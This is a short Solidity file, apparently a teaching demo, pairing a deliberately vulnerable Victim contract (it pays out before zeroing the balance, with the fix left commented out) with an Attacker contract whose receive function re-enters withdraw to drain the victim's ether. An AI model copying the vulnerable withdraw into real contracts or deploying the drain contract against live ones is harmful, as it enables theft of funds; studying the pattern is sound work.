// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/*
 * 测试过程：
 * 往受害者合约deposit存入3 eth,
 * 调用攻击者合约的attack函数 存入1 eth,
 * 攻击者合约的receive函数被调用,
 */
contract Victim {
    mapping(address => uint) private balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "balance is not enough");
        //    balances[msg.sender] = 0; 先重置余额, 防止重入
        (bool result,) = msg.sender.call{value: balances[msg.sender]}("");
        require(result, "call failed");
        balances[msg.sender] = 0;
    }

    function getBalanceByAddress(address addr) public view returns (uint) {
        return balances[addr];
    }

    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }

}

contract Attacker {
    Victim public target;
    uint private constant WITHDRAW_AMOUNT = 1 ether;

    constructor(address _target) {
        target = Victim(_target);
    }

    receive () external payable {
        if (address(target).balance >= WITHDRAW_AMOUNT) {
            target.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= WITHDRAW_AMOUNT, "value is not enough");
        target.deposit{value: WITHDRAW_AMOUNT}();
        target.withdraw();
    }
}